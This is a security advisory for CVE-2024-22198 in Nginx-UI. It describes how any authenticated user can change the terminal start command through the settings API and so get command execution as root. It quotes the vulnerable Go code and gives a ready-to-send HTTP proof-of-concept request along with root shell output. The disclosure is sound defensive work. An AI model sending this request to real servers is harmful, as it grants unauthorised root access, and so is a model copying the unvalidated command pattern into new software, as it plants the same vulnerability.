# Authenticated (user role) arbitrary command execution by modifying `start_cmd` setting (GHSL-2023-268)

**GHSA**: GHSA-8r25-68wm-jw35 | **CVE**: CVE-2024-22198 | **Severity**: high (CVSS 7.1)

**CWE**: CWE-77

**Affected Packages**:
- **github.com/0xJacky/Nginx-UI** (go): < 2.0.0.beta.9

## Description

### Summary
Nginx-UI is a web interface to manage Nginx configurations. It is vulnerable to arbitrary command execution by abusing the configuration settings.

### Details
The `Home > Preference` page exposes a list of system settings such as `Run Mode`, `Jwt Secret`, `Node Secret` and `Terminal Start Command`. The latter is used to specify the command to be executed when a user opens a terminal from the web interface. While the UI doesn't allow users to modify the `Terminal Start Command` setting, it is possible to do so by sending a request to the [API](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13).

```go
func InitPrivateRouter(r *gin.RouterGroup) {
    r.GET("settings", GetSettings)
    r.POST("settings", SaveSettings)
    ...
}
```

The [`SaveSettings`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18) function is used to save the settings. It is protected by the [`authRequired`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45) middleware, which requires a valid JWT token or a `X-Node-Secret` which must equal the `Node Secret` configuration value. However, given the lack of authorization roles, any authenticated user can modify the settings.

The `SaveSettings` function is defined as follows:

```go
func SaveSettings(c *gin.Context) {
    var json struct {
        Server settings.Server `json:"server"`
        ...
    }

    ...

    settings.ServerSettings = json.Server

    ...

    err := settings.Save()
    ...
}
```

The `Terminal Start Command` setting is stored as [`settings.ServerSettings.StartCmd`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/server.go#L12). By spawning a terminal with [`Pty`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/terminal/pty.go#L11), the `StartCmd` setting is used:

```go
func Pty(c *gin.Context) {
	...

	p, err := pty.NewPipeLine(ws)

	...
}
```

The [`NewPipeLine`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/pty/pipeline.go#L29) function is defined as follows:

```go
func NewPipeLine(conn *websocket.Conn) (p *Pipeline, err error) {
	c := exec.Command(settings.ServerSettings.StartCmd)

    ...
```
This issue was found using CodeQL for Go: [Command built from user-controlled sources](https://codeql.github.com/codeql-query-help/go/go-command-injection/).

#### Proof of Concept
> Based on [this setup](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/README.md?plain=1#L210) using `uozi/nginx-ui:v2.0.0-beta.7`.
1. Login as a newly created user.
2. Send the following request to modify the settings with `"start_cmd":"bash"` :
```http
POST /api/settings HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 512
Authorization: <<JWT TOKEN>>
Content-Type: application/json

{"nginx":{"access_log_path":"","error_log_path":"","config_dir":"","pid_path":"","test_config_cmd":"","reload_cmd":"","restart_cmd":""},"openai":{"base_url":"","token":"","proxy":"","model":""},"server":{"http_host":"0.0.0.0","http_port":"9000","run_mode":"debug","jwt_secret":"...","node_secret":"...","http_challenge_port":"9180","email":"...","database":"foo","start_cmd":"bash","ca_dir":"","demo":false,"page_size":10,"github_proxy":""}}
```
3. Open a terminal from the web interface and execute arbitrary commands as `root`:
```
root@1de46642d108:/app# id
uid=0(root) gid=0(root) groups=0(root)
```

### Impact
This issue may lead to authenticated Remote Code Execution, Privilege Escalation, and Information Disclosure.
